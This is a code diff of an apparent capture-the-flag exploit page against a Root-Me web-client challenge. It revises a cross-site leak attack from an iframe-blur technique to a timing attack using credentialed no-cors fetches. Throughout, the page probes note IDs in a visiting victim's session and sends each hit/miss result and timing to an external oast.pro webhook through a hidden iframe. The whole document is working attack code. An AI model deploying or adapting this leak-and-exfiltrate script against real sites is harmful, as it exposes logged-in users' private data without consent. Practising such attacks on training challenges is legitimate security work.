@@ -1,37 +1,22 @@
-<script>
 const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
 const WEBHOOK = "https://85531c6a18bfcfaeb4aegux4iseyyyyyb.oast.pro";
-
 const urlParams = new URLSearchParams(window.location.search);
 const startId = parseInt(urlParams.get('id'), 10) || 1;
+const THRESHOLD = 500;
 
-function testId(id, timeout = 30000) {
+function testId(id) {
     return new Promise((resolve) => {
-        let done = false;
-
-        const iframe = document.createElement("iframe");
-        iframe.src = TARGET + id + "#search_note";
-
-        const cleanup = (result) => {
-            if (done) return;
-            done = true;
-            window.removeEventListener("blur", onBlur);
-            iframe.remove();
-
-            const ex = document.createElement("iframe");
-            ex.style.display = "none";
-            ex.src = WEBHOOK + "?result=" + result + "&id=" + id;
-            document.body.appendChild(ex);
-
-            resolve(result);
-        };
-
-        const onBlur = () => cleanup("hit");
-
-        window.addEventListener("blur", onBlur, { once: true });
-        document.body.appendChild(iframe);
-
-        setTimeout(() => cleanup("miss"), timeout);
+        const start = performance.now();
+        fetch(TARGET + id, { mode: "no-cors", credentials: "include" })
+            .then(() => {
+                const elapsed = performance.now() - start;
+                const result = elapsed > THRESHOLD ? "hit" : "miss";
+                const ex = document.createElement("iframe");
+                ex.style.display = "none";
+                ex.src = WEBHOOK + "?result=" + result + "&id=" + id + "&ms=" + Math.round(elapsed);
+                document.body.appendChild(ex);
+                resolve(result);
+            });
     });
 }
 
@@ -40,4 +25,3 @@ window.onload = async function () {
         await testId(startId + i);
     }
 };
-</script>
